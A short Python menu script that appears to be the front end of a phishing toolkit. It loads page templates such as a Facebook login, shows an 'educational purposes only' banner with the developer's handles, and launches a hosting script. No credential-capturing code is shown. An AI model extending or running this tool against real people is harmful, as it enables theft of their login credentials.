#!/usr/bin/env python3
import subprocess
import json
from color_functions import type_text, display_template
from color_functions import cyan as cyan, magenta as magenta, reset as reset, yellow as yellow, green as green, light_blue as light_blue


# Clear the screen
subprocess.run(['clear'])

# Read templates from JSON manifest
with open('manifest.json', 'r') as manifest_file:
    manifest = json.load(manifest_file)
    templates = manifest.get('templates', [])

# Display the ASCII art
with open('doom.txt', 'r') as doom_file:
    doom_content = doom_file.read()
    print(f"{green}{doom_content}{reset}")

type_text(f"{yellow}{manifest['name']} is for educational purposes only‼️{reset}")
type_text(f"{light_blue}Follow and collaborate with the developer on{reset}")
print(f"  {yellow}[{green}~{yellow}] {magenta}GitHub  {cyan}:{green} @dummy-guy{reset}")
print(f"  {yellow}[{green}~{yellow}] {magenta}{magenta}Snapchat{cyan}:{green} @dummyguy123{reset}")
print("-------------------------------------------")
print()

print(f"{light_blue}Type template number to select it.{reset}")
type_text(f"{yellow}For example, type: 01 to select Facebook{reset}")
type_text(f"")

for i, template in enumerate(templates, start=1):
    index_str = str(i).zfill(2) 
    display_template(index_str, template)
    print()

type_text("Please wait...")

subprocess.run(['python3', '.templates/host.py'])

exit(0)
